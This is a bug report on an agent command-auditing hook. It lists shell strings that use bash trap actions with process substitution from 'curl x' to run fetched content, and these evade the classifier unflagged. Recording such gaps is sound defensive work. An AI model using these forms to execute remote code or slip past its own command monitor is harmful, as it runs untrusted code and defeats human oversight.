# agent-audit: trap actions run with the stdin of the context they fire in, not followed

- **Status:** Open
- **Reported:** 2026-11-18
- **Severity:** medium
- **Environment:** local (Claude Code hooks)
- **Source:** agent run: fix bug-audit-pipe-procsub-stdin-family, reviewers (see Evidence)
- **Related:** [pipe-readers entry](2026-11-16-audit-pipe-readers-not-piped-shell.md)

## Evidence

Security re-review of the fix. These pass:
- `trap 'bash' DEBUG; { :; } < <(curl x)`, `trap 'bash' ERR; { false; } < <(curl x)`
- `f() { bash; }; trap 'f' DEBUG; { :; } < <(curl x)`
- `echo 'git push' | { trap bash EXIT; }`

All via `analyze_command` on synthetic strings (nothing executed), flags `[]` for the passing forms.

## Steps to reproduce

1. Classify each command above.

## Expected behavior

A trap action that reads code gets the stdin of the context where it fires.

## Actual behavior

Not flagged.

## Root cause

Not diagnosed yet.

## Fix

Not fixed yet.
